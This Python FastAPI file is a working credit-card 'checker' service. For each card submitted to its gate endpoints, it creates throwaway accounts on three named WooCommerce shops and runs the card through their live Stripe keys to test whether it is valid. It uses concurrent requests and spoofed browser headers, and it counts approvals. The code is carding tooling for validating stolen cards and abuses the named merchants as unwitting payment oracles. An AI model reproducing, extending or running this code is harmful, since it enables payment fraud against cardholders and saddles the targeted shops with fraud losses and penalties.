import asyncio
import aiohttp
import re
import random
import string
from typing import Dict, Optional, List, Tuple
from datetime import datetime
from collections import defaultdict
import uvicorn
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse
from contextlib import asynccontextmanager

app = FastAPI(title="Multi-Site Card Authorization API")

# Semaphore to limit concurrent requests to 50
semaphore = asyncio.Semaphore(50)
timeout = aiohttp.ClientTimeout(total=60)

# Error counters
error_counters = defaultdict(lambda: {
    "total": 0,
    "approved": 0,
    "declined": 0,
    "error": 0
})

# Site configurations
SITES = {
    "reddsrestaurant": {
        "base_url": "https://reddsrestaurant.com",
        "stripe_key": "pk_live_WsZv3mL1dl6fpyly62t85Qb9",
        "requires_password": False,
        "ajax_action": "wc_stripe_create_and_confirm_setup_intent"
    },
    "aestheticjourneysdesigns": {
        "base_url": "https://aestheticjourneysdesigns.com",
        "stripe_key": "pk_live_5185RlDK2SdlpCSYRF4CAg7pFKnamr2G8Z6uZIwTNc99xqg87Fn7GUCrhtdOEdYyST89TVcUd0sggbqFle7qVEakq00Ro7vdjvc",
        "requires_password": False,
        "ajax_action": "wc_stripe_create_and_confirm_setup_intent"
    },
    "handtoolessentials": {
        "base_url": "https://handtoolessentials.com",
        "stripe_key": "pk_live_5ZSl1RXFaQ9bCbELMfLZxCsG",
        "requires_password": True,
        "password": "hunter321@",
        "ajax_action": "wc_stripe_create_and_confirm_setup_intent"
    }
}

class SiteAuthAPI:
    def __init__(self, site_name: str, site_config: Dict):
        self.site_name = site_name
        self.base_url = site_config["base_url"]
        self.stripe_api = "https://api.stripe.com/v1"
        self.stripe_key = site_config["stripe_key"]
        self.requires_password = site_config.get("requires_password", False)
        self.password = site_config.get("password", "")
        self.ajax_action = site_config.get("ajax_action", "wc_stripe_create_and_confirm_setup_intent")
        self.session = None
        self.cookies = None
        
    async def _get_headers(self, referer: str = None, is_ajax: bool = False):
        """Generate request headers"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json' if is_ajax else '*/*',
            'Accept-Language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
            'Sec-Ch-Ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
            'Sec-Ch-Ua-Mobile': '?1',
            'Sec-Ch-Ua-Platform': '"Android"',
        }
        
        if referer:
            headers['Referer'] = referer
            headers['Origin'] = self.base_url
            
        if is_ajax:
            headers['X-Requested-With'] = 'XMLHttpRequest'
            headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            
        return headers
    
    async def _generate_random_email(self) -> str:
        """Generate random email"""
        random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
        return f"{random_string}@temp-mail.org"
    
    async def _extract_nonce(self, html: str, pattern: str) -> Optional[str]:
        """Extract nonce from HTML"""
        match = re.search(pattern, html)
        return match.group(1) if match else None
    
    async def process_payment(self, card_details: str) -> Tuple[str, str]:
        """Process payment for specific site - returns (status, message)"""
        try:
            async with aiohttp.ClientSession(timeout=timeout) as self.session:
                # Step 1: Get register nonce
                url = f"{self.base_url}/my-account/add-payment-method/"
                headers = await self._get_headers(referer=url)
                
                async with self.session.get(url, headers=headers) as response:
                    self.cookies = response.cookies
                    html = await response.text()
                    register_nonce = await self._extract_nonce(html, r'woocommerce-register-nonce" value="([^"]+)"')
                    
                    if not register_nonce:
                        return ("declined", "Failed to get registration nonce")
                
                # Step 2: Register user
                email = await self._generate_random_email()
                headers = await self._get_headers(referer=url)
                headers['Content-Type'] = 'application/x-www-form-urlencoded'
                headers['Upgrade-Insecure-Requests'] = '1'
                
                data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': url,
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': url,
                    'wc_order_attribution_session_start_time': '2026-04-02 11:57:15',
                    'wc_order_attribution_session_pages': '8',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['User-Agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/add-payment-method/',
                    'register': 'Register'
                }
                
                if self.requires_password:
                    data['password'] = self.password
                
                async with self.session.post(url, headers=headers, data=data) as response:
                    self.cookies = response.cookies
                    response_text = await response.text()
                    
                    if response.status != 200:
                        return ("declined", "Registration failed")
                    
                    nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response_text)
                    if not nonce_match:
                        return ("declined", "Failed to get add payment nonce")
                    add_payment_nonce = nonce_match.group(1)
                
                # Step 3: Create payment method with Stripe
                parts = card_details.split('|')
                card_number, exp_month, exp_year, cvc = parts
                if len(exp_year) == 4:
                    exp_year = exp_year[2:]
                
                stripe_headers = {
                    'Authority': 'api.stripe.com',
                    'Accept': 'application/json',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'Origin': 'https://js.stripe.com',
                    'Referer': 'https://js.stripe.com/',
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
                }
                
                stripe_data = {
                    'type': 'card',
                    'card[number]': card_number,
                    'card[cvc]': cvc,
                    'card[exp_year]': exp_year,
                    'card[exp_month]': exp_month,
                    'allow_redisplay': 'unspecified',
                    'billing_details[address][country]': 'IN',
                    'payment_user_agent': 'stripe.js/804ae66e17; stripe-js-v3/804ae66e17; payment-element; deferred-intent; autopm',
                    'referrer': self.base_url,
                    'time_on_page': '44820',
                    'key': self.stripe_key,
                    '_stripe_version': '2025-09-30.clover'
                }
                
                async with self.session.post(f"{self.stripe_api}/payment_methods", headers=stripe_headers, data=stripe_data) as response:
                    result = await response.json()
                    
                    if 'id' not in result:
                        return ("declined", "Error creating payment method")
                    
                    payment_method_id = result.get('id')
                
                # Step 4: Confirm setup intent
                ajax_url = f"{self.base_url}/wp-admin/admin-ajax.php"
                ajax_headers = await self._get_headers(
                    referer=f"{self.base_url}/my-account/add-payment-method/",
                    is_ajax=True
                )
                
                ajax_data = {
                    'action': self.ajax_action,
                    'wc-stripe-payment-method': payment_method_id,
                    'wc-stripe-payment-type': 'card',
                    '_ajax_nonce': add_payment_nonce
                }
                
                async with self.session.post(ajax_url, headers=ajax_headers, data=ajax_data) as response:
                    result = await response.json()
                    if result.get('success'):
                        return ("approved", "Payment method added successfully")
                    else:
                        error_msg = result.get('data', {}).get('error', {}).get('message', 'Card was declined')
                        return ("declined", error_msg)
            
        except asyncio.TimeoutError:
            return ("error", "Request timeout")
        except Exception as e:
            return ("error", f"Error: {str(e)}")


async def authorize_card_for_site(site_name: str, card_details: str) -> Dict:
    """Authorize card for a specific site"""
    site_config = SITES.get(site_name)
    if not site_config:
        return {"status": "error", "response": "Site not found", "site": site_name}
    
    api = SiteAuthAPI(site_name, site_config)
    status, message = await api.process_payment(card_details)
    return {"status": status, "response": message, "site": site_name}


async def authorize_card_random_site(card_details: str) -> Dict:
    """Authorize card using a random site"""
    site_name = random.choice(list(SITES.keys()))
    return await authorize_card_for_site(site_name, card_details)


async def authorize_gate1_rotate(card_details: str) -> Tuple[str, str]:
    """Gate 1 - Rotates between reddsrestaurant and aestheticjourneysdesigns"""
    sites_to_try = ["reddsrestaurant", "aestheticjourneysdesigns"]
    random.shuffle(sites_to_try)
    
    for site_name in sites_to_try:
        site_config = SITES[site_name]
        api = SiteAuthAPI(site_name, site_config)
        status, message = await api.process_payment(card_details)
        if status == "approved":
            return ("approved", f"{site_name}")
        if status == "error":
            continue
        continue
    
    return ("declined", "No site approved")


async def authorize_gate2_fixed(card_details: str) -> Tuple[str, str]:
    """Gate 2 - Fixed to handtoolessentials"""
    site_config = SITES["handtoolessentials"]
    api = SiteAuthAPI("handtoolessentials", site_config)
    return await api.process_payment(card_details)


async def authorize_all_sites(card_details: str) -> List[Dict]:
    """Authorize card on all sites in parallel"""
    tasks = []
    for site_name in SITES.keys():
        task = asyncio.create_task(authorize_card_for_site(site_name, card_details))
        tasks.append(task)
    
    results = await asyncio.gather(*tasks, return_exceptions=True)
    
    processed_results = []
    for result in results:
        if isinstance(result, Exception):
            processed_results.append({
                "site": "unknown",
                "status": "error",
                "response": str(result)
            })
        else:
            site = result.get("site")
            status = result.get("status")
            if site in error_counters:
                error_counters[site]["total"] += 1
                if status == "approved":
                    error_counters[site]["approved"] += 1
                elif status == "declined":
                    error_counters[site]["declined"] += 1
                else:
                    error_counters[site]["error"] += 1
            processed_results.append(result)
    
    return processed_results


@app.get("/gate1")
async def check_gate1(cc: str = Query(..., description="Card details in format: card_number|exp_month|exp_year|cvc")):
    """Check card using Gate 1 (Rotates between 2 sites)"""
    async with semaphore:
        try:
            parts = cc.split('|')
            if len(parts) != 4:
                raise HTTPException(status_code=400, detail="Invalid card format")
            
            status, message = await authorize_gate1_rotate(cc)
            
            return JSONResponse(
                status_code=200,
                content={
                    "gate": "gate1_rotating",
                    "status": status,
                    "response": message,
                    "card": f"{parts[0][:6]}...{parts[0][-4:]}"
                }
            )
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Error: {str(e)}")


@app.get("/gate2")
async def check_gate2(cc: str = Query(..., description="Card details in format: card_number|exp_month|exp_year|cvc")):
    """Check card using Gate 2 (Fixed to handtoolessentials)"""
    async with semaphore:
        try:
            parts = cc.split('|')
            if len(parts) != 4:
                raise HTTPException(status_code=400, detail="Invalid card format")
            
            status, message = await authorize_gate2_fixed(cc)
            
            return JSONResponse(
                status_code=200,
                content={
                    "gate": "gate2_fixed",
                    "status": status,
                    "response": message,
                    "card": f"{parts[0][:6]}...{parts[0][-4:]}"
                }
            )
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Error: {str(e)}")


@app.get("/check")
async def check_card(cc: str = Query(..., description="Card details in format: card_number|exp_month|exp_year|cvc")):
    """Check card using random site (legacy)"""
    async with semaphore:
        try:
            parts = cc.split('|')
            if len(parts) != 4:
                raise HTTPException(status_code=400, detail="Invalid card format")
            
            result = await authorize_card_random_site(cc)
            
            site = result.get("site")
            status = result.get("status")
            if site in error_counters:
                error_counters[site]["total"] += 1
                if status == "approved":
                    error_counters[site]["approved"] += 1
                elif status == "declined":
                    error_counters[site]["declined"] += 1
                else:
                    error_counters[site]["error"] += 1
            
            return JSONResponse(
                status_code=200,
                content={
                    "site": result.get("site"),
                    "status": result.get("status"),
                    "response": result.get("response"),
                    "card": f"{parts[0][:6]}...{parts[0][-4:]}"
                }
            )
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")


@app.get("/testsites")
async def test_all_sites(cc: str = Query(..., description="Card details in format: card_number|exp_month|exp_year|cvc")):
    """Test card on all sites in parallel"""
    async with semaphore:
        try:
            parts = cc.split('|')
            if len(parts) != 4:
                raise HTTPException(status_code=400, detail="Invalid card format")
            
            results = await authorize_all_sites(cc)
            
            return JSONResponse(
                status_code=200,
                content={
                    "card": f"{parts[0][:6]}...{parts[0][-4:]}",
                    "results": results,
                    "summary": {
                        r["site"]: {
                            "status": r["status"],
                            "response": r["response"]
                        } for r in results if "site" in r
                    }
                }
            )
        except HTTPException:
            raise
        except Exception as e:
            raise HTTPException(status_code=500, detail=f"Internal server error: {str(e)}")


@app.get("/error_count")
async def get_error_count():
    """Get error counters for all sites"""
    return JSONResponse(
        status_code=200,
        content=dict(error_counters)
    )


@app.get("/health")
async def health_check():
    """Health check endpoint"""
    return {
        "status": "healthy",
        "max_concurrent": 50,
        "timeout_seconds": 60,
        "sites": list(SITES.keys())
    }


@app.on_event("startup")
async def startup_event():
    print("API Started - Ready to handle requests")
    print("Endpoints:")
    print("  - GET /gate1?cc=card|month|year|cvc (rotating between 2 sites)")
    print("  - GET /gate2?cc=card|month|year|cvc (fixed to handtoolessentials)")
    print("  - GET /check?cc=card|month|year|cvc (random site)")
    print("  - GET /testsites?cc=card|month|year|cvc (all sites)")
    print("  - GET /error_count")
    print("  - GET /health")


if __name__ == "__main__":
    uvicorn.run(
        app, 
        host="0.0.0.0", 
        port=8000, 
        workers=1,
        limit_concurrency=50,
        timeout_keep_alive=30
    )